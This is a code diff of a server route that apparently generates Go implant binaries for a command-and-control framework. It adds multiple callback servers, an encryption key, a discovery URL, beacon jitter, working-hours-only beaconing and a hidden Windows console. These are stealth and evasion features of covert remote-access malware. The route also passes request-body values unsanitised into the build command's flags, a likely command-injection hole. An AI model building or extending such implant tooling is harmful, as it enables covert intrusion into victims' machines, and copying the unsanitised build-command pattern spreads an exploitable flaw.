@@ -17,10 +17,18 @@ if (!fs.existsSync(PAYLOAD_DIR)) {
  * Triggers a Go build for a new agent
  */
 router.post('/generate', verifyToken, async (req, res) => {
-  const { serverUrl, showGui, interval = 10, jitter = 15 } = req.body;
+  const { 
+    serverUrls, 
+    showGui, 
+    interval = 10, 
+    jitter = 15,
+    psk,
+    discoveryUrl,
+    workHours
+  } = req.body;
 
-  if (!serverUrl) {
-    return res.status(400).json({ error: 'Server URL is required' });
+  if (!serverUrls) {
+    return res.status(400).json({ error: 'Server URLs are required' });
   }
 
   const payloadId = uuidv4();
@@ -31,21 +39,31 @@ router.post('/generate', verifyToken, async (req, res) => {
   const agentSourceDir = path.join(__dirname, '../../../agent');
   
   // Calculate BeaconMax based on jitter %
-  // BeaconMin = interval
-  // BeaconMax = interval + (interval * jitter / 100)
   const beaconMin = parseInt(interval);
   const beaconMax = Math.ceil(beaconMin + (beaconMin * (parseInt(jitter) / 100)));
 
   // Construct the go build command
-  // We use ldflags to inject config values
-  let ldflags = `-X 'bytecode-agent/internal/config.DefaultServerURL=${serverUrl}'`;
+  let ldflags = `-X 'bytecode-agent/internal/config.DefaultServerURL=${serverUrls}'`;
   ldflags += ` -X 'bytecode-agent/internal/config.DefaultBeaconMin=${beaconMin}'`;
   ldflags += ` -X 'bytecode-agent/internal/config.DefaultBeaconMax=${beaconMax}'`;
+  
+  if (psk) {
+    ldflags += ` -X 'bytecode-agent/internal/config.DefaultEncryptionKey=${psk}'`;
+  }
+  
+  if (discoveryUrl) {
+    ldflags += ` -X 'bytecode-agent/internal/config.DefaultDiscoveryURL=${discoveryUrl}'`;
+  }
+
+  if (workHours && workHours.enabled) {
+    ldflags += ` -X 'bytecode-agent/internal/config.DefaultWorkHoursEnabled=true'`;
+    ldflags += ` -X 'bytecode-agent/internal/config.DefaultWorkHoursStart=${workHours.start}'`;
+    ldflags += ` -X 'bytecode-agent/internal/config.DefaultWorkHoursEnd=${workHours.end}'`;
+  }
   
   if (showGui) {
     ldflags += ` -X 'bytecode-agent/internal/config.DebugMode=true'`;
   } else {
-    // -H=windowsgui hides the console window on Windows
     ldflags += ` -H=windowsgui`;
   }
 
